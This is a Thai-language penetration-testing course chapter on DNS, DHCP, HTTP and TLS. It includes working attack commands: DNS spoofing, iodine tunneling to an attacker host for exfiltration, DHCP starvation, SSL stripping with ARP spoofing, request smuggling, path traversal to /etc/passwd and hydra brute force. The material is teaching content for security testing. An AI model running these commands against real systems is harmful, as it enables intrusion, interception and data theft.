# Part 05: DNS, DHCP, HTTP/HTTPS Protocols

## สารบัญ
- [DNS Protocol เชิงลึก](#dns-protocol-เชิงลึก)
- [DNS Attacks](#dns-attacks)
- [DHCP Protocol](#dhcp-protocol)
- [HTTP Protocol เชิงลึก](#http-protocol-เชิงลึก)
- [HTTPS และ TLS/SSL](#https-และ-tlsssl)
- [HTTP Attacks](#http-attacks)
- [แบบฝึกหัด](#แบบฝึกหัด)

---

## DNS Protocol เชิงลึก

### DNS Packet Format

```
DNS Query/Response:
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
|                      ID                          |
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
|QR|  Opcode  |AA|TC|RD|RA|   Z    |   RCODE      |
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
|                    QDCOUNT                       |
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
|                    ANCOUNT                       |
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
|                    NSCOUNT                       |
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
|                    ARCOUNT                       |
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
```

### DNS Enumeration สำหรับ Pentest

```bash
# WHOIS lookup
whois target.com
whois 192.168.1.100

# DNS lookup พื้นฐาน
dig target.com
dig target.com A
dig target.com MX
dig target.com NS
dig target.com TXT
dig target.com AAAA
dig target.com SOA
dig target.com CNAME

# Reverse DNS lookup
dig -x 192.168.1.100
nslookup 192.168.1.100

# DNS zone transfer
dig axfr target.com @ns1.target.com
nmap --script dns-zone-transfer --script-args 'dns-zone-transfer.domain=target.com' ns1.target.com

# DNS brute force
dnsenum --enum target.com
dnsmap target.com
sublist3r -d target.com

# fierce DNS scanner
fierce --domain target.com

# DNS cache snooping
dig @8.8.8.8 target.com +norecurse

# dnsx - fast DNS resolver
echo target.com | dnsx -a -aaaa -cname -mx -ns -txt
```

### DNS Zone Transfer

```bash
# ค้นหา nameservers
dig target.com NS

# ลอง zone transfer
dig axfr @ns1.target.com target.com
dig axfr @ns2.target.com target.com

# ถ้าสำเร็จจะเห็น:
# target.com.      3600  IN  SOA   ns1.target.com....
# target.com.      3600  IN  NS    ns1.target.com.
# mail.target.com. 3600  IN  A     192.168.1.5
# www.target.com.  3600  IN  A     192.168.1.10
# ftp.target.com.  3600  IN  A     192.168.1.20
# ...

# Script
host -l target.com ns1.target.com

# Nmap
nmap --script dns-zone-transfer.nse -p 53 ns1.target.com
```

### Subdomain Enumeration

```bash
# sublist3r
sublist3r -d target.com -o subdomains.txt

# amass (comprehensive)
amass enum -d target.com
amass enum -passive -d target.com

# assetfinder
assetfinder --subs-only target.com

# subfinder
subfinder -d target.com -o subdomains.txt

# dnsx (resolve)
cat subdomains.txt | dnsx -a -resp

# httpx (find web servers)
cat subdomains.txt | httpx -status-code -title

# ดูทั้งหมดใน pipeline
subfinder -d target.com -silent | dnsx -silent | httpx -status-code -title
```

---

## DNS Attacks

### DNS Spoofing

```
กระบวนการ:
1. Attacker ดัก DNS query
2. ตอบกลับด้วย IP ปลอม
3. Victim เข้าไปยัง IP ปลอมโดยไม่รู้ตัว

ตัวอย่าง:
- Victim: "ที่ไหนคือ bank.com?"
- Attacker ดัก -> ตอบ: "bank.com อยู่ที่ 192.168.1.50" (IP ของ attacker)
- Victim เชื่อมต่อไปยัง fake site
```

```bash
# DNS Spoofing ด้วย dnsspoof
dnsspoof -i eth0 -f /tmp/hosts
# /tmp/hosts:
# 192.168.1.50 www.bank.com
# 192.168.1.50 *.bank.com

# ด้วย Responder (ต้องได้รับอนุญาต)
python3 /usr/share/responder/Responder.py -I eth0 -rdwv
```

### DNS Tunneling

```bash
# DNS tunneling เพื่อ exfiltrate data
# ข้อมูลถูกซ่อนใน DNS queries

# ตัวอย่างการทำงาน:
# ส่งข้อมูล: base64(data).attacker.com
# 68656c6c6f.attacker.com -> GET query
# Server attacker จะรับ subdomain = 68656c6c6f = "hello"

# เครื่องมือ: iodine, dns2tcp
# Server side:
iodined -f -c -P password 10.0.0.1 tunneling.attacker.com

# Client side:
iodine -f -P password tunneling.attacker.com
```

---

## DHCP Protocol

### การทำงาน DHCP

```
DHCP DORA Process:

Client                DHCP Server
  |                        |
  |-- DISCOVER (broadcast) | "ใครเป็น DHCP server?"
  |                        |
  | <-- OFFER ------------ | "ผม! นี่คือ IP: 192.168.1.100"
  |                        |
  |-- REQUEST ------------> | "ขอ IP 192.168.1.100"
  |                        |
  | <-- ACK -------------- | "ตกลง! ระยะเวลา 24 ชั่วโมง"
  |                        |
```

### DHCP ใน Penetration Testing

```bash
# ดู DHCP leases
cat /var/lib/dhcp/dhclient.leases
cat /var/lib/dhcpcd/dhcpcd-eth0.lease

# Capture DHCP traffic
sudo tcpdump -i eth0 port 67 or port 68 -w /tmp/dhcp.pcap

# DHCP Starvation (ต้องได้รับอนุญาต)
# ทำให้ DHCP pool หมด
yersinia -G  # GUI tool
yersinia dhcp -attack 1 -interface eth0

# Rogue DHCP Server
# หลังจาก DHCP Starvation ตั้ง server ปลอม
# แจก gateway ปลอมเพื่อ MITM
```

---

## HTTP Protocol เชิงลึก

### HTTP Request Format

```
GET /index.html HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
Cookie: session=abc123
Connection: keep-alive

```

### HTTP Response Format

```
HTTP/1.1 200 OK
Date: Mon, 01 Jan 2024 00:00:00 GMT
Server: Apache/2.4.41
Content-Type: text/html
Content-Length: 1024
Set-Cookie: session=abc123; HttpOnly; Secure

<!DOCTYPE html>
<html>...
```

### HTTP Methods

| Method | วัตถุประสงค์ | Security Concern |
|--------|-------------|------------------|
| GET | ดึงข้อมูล | Query params ใน URL |
| POST | ส่งข้อมูล | Body data |
| PUT | อัปเดต | CSRF, unauthorized update |
| DELETE | ลบ | Unauthorized delete |
| PATCH | แก้ไขบางส่วน | Same as PUT |
| HEAD | แค่ headers | Info disclosure |
| OPTIONS | ดู methods | Method enumeration |
| TRACE | Echo request | XST attacks |

### HTTP Status Codes

| Code | ความหมาย | ประโยชน์ใน Pentest |
|------|----------|--------------------|
| 200 | OK | หน้าเพจมีอยู่ |
| 201 | Created | สร้างสำเร็จ |
| 301/302 | Redirect | Follow redirects |
| 400 | Bad Request | Input validation |
| 401 | Unauthorized | Auth required |
| 403 | Forbidden | อาจมีอยู่แต่ไม่มีสิทธิ์ |
| 404 | Not Found | ไม่มีอยู่ |
| 405 | Method Not Allowed | Method restriction |
| 500 | Server Error | Vulnerability |
| 503 | Service Unavailable | DoS |

### HTTP Headers ที่สำคัญ

```bash
# ดู headers ด้วย curl
curl -I http://target.com

# สำคัญสำหรับ security:
# Request Headers:
# User-Agent: browser info
# Cookie: session tokens
# Authorization: credentials
# Content-Type: data format
# Referer: previous page
# X-Forwarded-For: original IP

# Response Headers:
# Server: web server info (info disclosure)
# X-Powered-By: technology (info disclosure)
# Set-Cookie: cookie settings
# Content-Security-Policy: XSS protection
# X-Frame-Options: clickjacking protection
# Strict-Transport-Security: HTTPS only

# Missing headers = vulnerabilities
curl -I http://target.com | grep -i 'x-frame\|csp\|hsts\|x-xss'
```

---

## HTTPS และ TLS/SSL

### TLS Handshake

```
Client                    Server
  |                          |
  |-- ClientHello ---------->| "ผมรองรับ TLS 1.3, ciphers: ..."
  |                          |
  |<-- ServerHello ----------| "ใช้ TLS 1.3, cipher: AES-256-GCM"
  |<-- Certificate ----------| "นี่คือ certificate ของผม"
  |<-- ServerHelloDone ------|
  |                          |
  |-- ClientKeyExchange ---->| ส่ง pre-master secret
  |-- ChangeCipherSpec ----->|
  |-- Finished ------------->|
  |                          |
  |<-- ChangeCipherSpec -----|
  |<-- Finished -------------|
  |                          |
  |=== Encrypted Channel ====|
```

### SSL/TLS Attacks

```bash
# ตรวจสอบ SSL configuration
nmap --script ssl-enum-ciphers -p 443 target.com
ssl-scan target.com
testssl.sh target.com

# ค้นหา weak ciphers
testssl.sh --cipher-per-proto target.com

# Check certificate
echo | openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -text

# Heartbleed (CVE-2014-0160)
nmap --script ssl-heartbleed -p 443 target.com

# POODLE check
nmap --script ssl-poodle -p 443 target.com

# DROWN check
nmap --script sslv2 -p 443 target.com

# SSL stripping
# ใช้ sslstrip หรือ bettercap
bettercap -iface eth0
bettercap> set http.proxy.sslstrip true
bettercap> arp.spoof on
bettercap> http.proxy on
```

---

## HTTP Attacks

### HTTP Request Smuggling

```
เกิดเมื่อ frontend และ backend ตีความ Content-Length และ Transfer-Encoding ต่างกัน

Attacker ส่ง:
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Foo: X

Backend อาจตีความว่าเป็น 2 requests:
1. POST / (body: "0\r\n\r\n")
2. GET /admin (unauthorized!)
```

### HTTP Parameter Pollution

```bash
# ส่ง parameter ซ้ำกัน
curl 'http://target.com/search?q=test&q=<script>'

# servers ต่างกันจัดการต่างกัน:
# Apache: ใช้ตัวแรก
# PHP: ใช้ตัวหลัง
# ASP.NET: รวมกัน
```

### Directory Traversal

```bash
# เข้าถึงไฟล์นอก web root
curl 'http://target.com/download?file=../../../etc/passwd'
curl 'http://target.com/download?file=....//....//....//etc/passwd'
curl 'http://target.com/download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'

# Windows path traversal
curl 'http://target.com/download?file=..\..\..\windows\system32\drivers\etc\hosts'
```

### HTTP Authentication Attacks

```bash
# Basic Auth brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-get /admin

# Digest Auth
hydra -l admin -P passwords.txt target.com http-get /protected

# Form-based brute force
hydra -l admin -P passwords.txt target.com http-post-form '/login:username=^USER^&password=^PASS^:Invalid password'

# Bypass with different methods
curl -X GET http://target.com/admin  # ลอง GET แทน POST
curl -H 'X-Original-URL: /admin' http://target.com/  # Header bypass
curl http://target.com/%2fadmin    # URL encoding
```

---

## HTTP Analysis ด้วย Burp Suite

```
1. ตั้งค่า Burp proxy: 127.0.0.1:8080
2. ตั้งค่า browser ให้ใช้ proxy
3. Import Burp CA certificate
4. Browse target site
5. วิเคราะห์ใน Burp:
   - Proxy > HTTP history
   - Inspector (headers, body, cookies)
   - Target > Site map
   - Repeater (ทดสอบ requests)
```

```bash
# ดู HTTP traffic ด้วย mitmproxy
mitmproxy -p 8080
# กด ? เพื่อดู help

# Capture HTTP ด้วย tcpdump
sudo tcpdump -i eth0 port 80 -A

# Parse HTTP headers
curl -sv http://target.com 2>&1 | grep -E '^[<>]'

# หา interesting headers
curl -I http://target.com 2>&1 | grep -iE 'server|powered|x-frame|content-security|strict'
```

---

## แบบฝึกหัด

### แบบฝึกหัดที่ 1: DNS Enumeration

```bash
# ทำ DNS enumeration บน target
TARGET="google.com"

echo "=== A Records ==="
dig $TARGET A +short

echo "=== MX Records ==="
dig $TARGET MX +short

echo "=== NS Records ==="
dig $TARGET NS +short

echo "=== TXT Records ==="
dig $TARGET TXT +short

echo "=== Zone Transfer ==="
for ns in $(dig $TARGET NS +short); do
    echo "Trying zone transfer from $ns:"
    dig axfr $TARGET @$ns
done
```

### แบบฝึกหัดที่ 2: HTTP Analysis

```bash
# วิเคราะห์ HTTP headers
TARGET="http://testphp.vulnweb.com"

curl -I $TARGET

# ดู security headers
echo "=== Security Headers ==="
curl -I $TARGET 2>/dev/null | grep -iE 'x-frame|csp|hsts|x-xss|x-content'

# ค้นหา server information
curl -I $TARGET 2>/dev/null | grep -iE 'server|powered|version'

# ลอง methods
for method in GET POST PUT DELETE HEAD OPTIONS TRACE; do
    code=$(curl -s -o /dev/null -w "%{http_code}" -X $method $TARGET)
    echo "$method: $code"
done
```

---

## สรุป

| Protocol | Port | ความเสี่ยง |
|----------|------|----------|
| DNS | 53 | Zone Transfer, Spoofing, Tunneling |
| DHCP | 67/68 | Starvation, Rogue Server |
| HTTP | 80 | SQLi, XSS, Traversal |
| HTTPS | 443 | SSL attacks, MITM |

**Part ถัดไป:** [Part 06: Kali Linux Tools Overview](Part-06-Kali-Linux-Tools-Overview.md)

---
*Part 05/100 | Kali Linux Course*
